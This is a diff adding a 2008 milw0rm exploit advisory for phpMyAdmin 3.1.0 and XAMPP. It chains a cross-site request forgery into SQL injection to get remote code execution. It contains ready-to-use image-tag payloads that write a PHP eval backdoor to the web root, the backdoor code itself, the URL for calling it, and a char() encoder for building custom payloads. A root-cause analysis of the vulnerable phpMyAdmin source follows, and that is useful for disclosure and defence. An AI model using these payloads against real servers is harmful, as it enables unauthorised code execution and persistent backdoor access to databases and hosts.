@@ -1,0 +1,185 @@
+Written by Michael Brooks
+Special Thanks to str0ke and rGod
+
+Intro:
+phpMyAdmin is by far the most popular PHP project.    Between
+phpmyadmin  and the xampp project  there are more than 34+ million
+downloads from sourceforge.net .   This exploit was released along
+side  XSRF attacks against XAMPP and Simple Directory Listing
+effectively breaking the top 3 php projects in the same day.
+
+Vulnerable Software info:
+SQL injection in phpMyAdmin by means of XSRF.
+Exploit tested on Version 3.1.0  release on: 2008-12-01
+Works with magic_quotes_gpc=On or Off.
+
+Exploit information:
+This is a Remote php code execution PoC exploit.   The exploit is
+dropping a php backdoor into /var/www/backdoor.php,  this attack will
+not work on the newest Ubuntu or Fedora... machines due to AppArmor
+and SELinux respectively.
+
+This is a XSRF attack to access SQL Injection so the same rules for
+executing XSRF attacks still apply.
+Steps for exploitation:
+1)The Victim's browser must be authenticated to phpMyAdmin at the time
+of attack.
+2)You must know the URL to phpMyAdmin.
+3)Finly,  to execute the attack the Victim's browser then needs to
+view the malicious img tag:
+
+Exploit for *nix:
+<html>
+<img src="http://10.1.1.10/phpmyadmin/tbl_structure.php?db=information_schema&table=TABLES%60+where+0+union+select+char%2860%2C+63%2C+112%2C+104%2C+112%2C+32%2C+101%2C+118%2C+97%2C+108%2C+40%2C+36%2C+95%2C+71%2C+69%2C+84%2C+91%2C+101%2C+93%2C+41%2C+63%2C+62%29+into+outfile+%22%2Fvar%2Fwww%2Fbackdoor.php%22+--+1">
+</html>
+path:
+/var/www/backdoor.php
+backdoor:
+<?php eval($_GET[e]);?>
+
+Exploit for a Default XAMPP for Windows Version 1.6.8:
+<html>
+<img src="http://10.1.1.10/phpmyadmin/tbl_structure.php?db=information_schema&table=TABLES%60+where+0+union+select+char%2860%2C+63%2C+112%2C+104%2C+112%2C+32%2C+101%2C+118%2C+97%2C+108%2C+40%2C+115%2C+116%2C+114%2C+105%2C+112%2C+115%2C+108%2C+97%2C+115%2C+104%2C+101%2C+115%2C+40%2C+36%2C+95%2C+71%2C+69%2C+84%2C+91%2C+101%2C+93%2C+41%2C+41%2C+59%2C+63%2C+62%29+into+outfile+%22c%3A%2Fxampp%2Fhtdocs%2Fbackdoor.php%22+--+1">
+</html>
+path:
+c:/xampp/htdocs/backdoor.php
+backdoor:
+<?php eval(stripslashes($_GET[e]));?>
+
+The backdoor can be accessed via
+http://10.1.1.10/backdoor.php?e=phpinfo();
+
+As a side note, this attack is only GET based so no JavaScript or
+ActionScript required!  Screw you NoScript!!!
+
+
+Technical Details:
+The exact sql query that is being executed:
+SELECT COUNT(*) FROM `TABLES` where 0 union select char(60, 63, 112,
+104, 112, 32, 101, 118, 97, 108, 40, 36, 95, 71, 69, 84, 91, 101, 93,
+41, 63, 62) into outfile "/var/www/backdoor.php" -- 1`;
+
+The char() mysql function is being used because the first SQL query is
+selecting integer values.    The following php code can be used to
+build a custom payload,  the current payload is: <?php
+eval($_GET[e])?>
+
+<?php
+print charEncode($_GET[code]);
+function charEncode($string){
+	$char="char(";
+	$size=strlen($string);
+	for($x=0;$x<$size;$x++){
+		$char.=ord($string[$x]).", ";
+	}
+	$char[strlen($char)-2]=")%00";
+	return $char;
+}
+?>
+retroGod  showed me this encoding method back when milw0rm still had a forum.
+
+By default,  if this query is malformed it will redirect you to a
+blank query window.  This fooled me for a while,  but then I modified
+a line and then I could see that I was in fact causing a mysql error.
+./phpmyadmin/libraries/dbi/mysql.dbi.lib.php line 126:
+return mysql_query($query,$link);
+change it to:
+return mysql_query($query,$link) or die($query."<br>".mysql_error($link));
+
+The query that is vulnerable to sql injection is being built in
+./phpmyadmin/libraries/db_table_exists.lib.php on line: 63
+		$_result = PMA_DBI_try_query(
+                   'SELECT COUNT(*) FROM `' .
+PMA_sqlAddslashes($table, true) . '`;',
+                    null, PMA_DBI_QUERY_STORE);
+		
+The PMA_sqlAddslashes() only disrupts the use of single quotes '.
+This function doesn't protect against sql injection because it ignores
+back-ticks ` and  double-quotes ".
+
+
+This attack is not a textbook example of XSRF, because phpMyAdmin does
+have protection against XSRF.  The token used to protect requests is
+generated in a secure manner:
+./phpmyadmin/libraries/session.ic.php line 96:
+if (!isset($_SESSION[' PMA_token '])) {
+    $_SESSION[' PMA_token '] = md5(uniqid(rand(), true));
+}
+As a note the call to md5(); is superstitious.  It doesn't add nor
+does it subtract to the session security. Possible md5() collisions do
+not affect the integrity of the cryptographic nonce.
+
+The vulnerability is because some request variables are exempt from
+token's protection.  For instance the request variables 'db' and
+'table'  used in the attack are not unset().
+./phpmyadmin/libraries/common.inc.php line 389:
+if (! PMA_isValid($_REQUEST['token']) || $_SESSION[' PMA_token '] !=
+$_REQUEST['token']) {
+    /**
+     *  List of parameters which are allowed from unsafe source
+     */
+    $allow_list = array(
+        /* needed for direct access, see FAQ 1.34
+         * also, server needed for cookie login screen (multi-server)
+         */
+        'server', 'db', 'table', 'target',
+        /* Session ID */
+        'phpMyAdmin',
+        /* Cookie preferences */
+        'pma_lang', 'pma_charset', 'pma_collation_connection',
+        /* Possible login form */
+        'pma_servername', 'pma_username', 'pma_password',
+        /* rajk - for playing blobstreamable media */
+        'media_type', 'custom_type', 'bs_reference',
+        /* rajk - for changing BLOB repository file MIME type */
+        'bs_db', 'bs_table', 'bs_ref', 'bs_new_mime_type'
+    );
+    /**
+     * Require cleanup functions
+     */
+    require_once './libraries/cleanup.lib.php';
+    /**
+     * Do actual cleanup
+     */
+    PMA_remove_request_vars($allow_list);
+
+}
+
+and  PMA_remove_request_vars() is in ./phpmyadmin/librarires/cleanup.lib.php:
+
+function PMA_remove_request_vars(&$whitelist)
+{
+    // do not check only $_REQUEST because it could have been overwritten
+    // and use type casting because the variables could have become
+    // strings
+    $keys = array_keys(array_merge((array)$_REQUEST, (array)$_GET,
+(array)$_POST, (array)$_COOKIE));
+
+    foreach($keys as $key) {
+        if (! in_array($key, $whitelist)) {
+            unset($_REQUEST[$key], $_GET[$key], $_POST[$key], $GLOBALS[$key]);
+        } else {
+            // allowed stuff could be compromised so escape it
+            // we require it to be a string
+            if (isset($_REQUEST[$key]) && ! is_string($_REQUEST[$key])) {
+                unset($_REQUEST[$key]);
+            }
+            if (isset($_POST[$key]) && ! is_string($_POST[$key])) {
+                unset($_POST[$key]);
+            }
+            if (isset($_COOKIE[$key]) && ! is_string($_COOKIE[$key])) {
+                unset($_COOKIE[$key]);
+            }
+            if (isset($_GET[$key]) && ! is_string($_GET[$key])) {
+                unset($_GET[$key]);
+            }
+        }
+    }
+}
+As a note,  the & in this function declaration
+PMA_remove_request_vars(&$whitelist) means to pass the variable by
+reference,  however this function doesn't use that variable reference.
+   Again this is superstitious because it has no effect on the code
+its self.
+
+# milw0rm.com [2008-12-08]
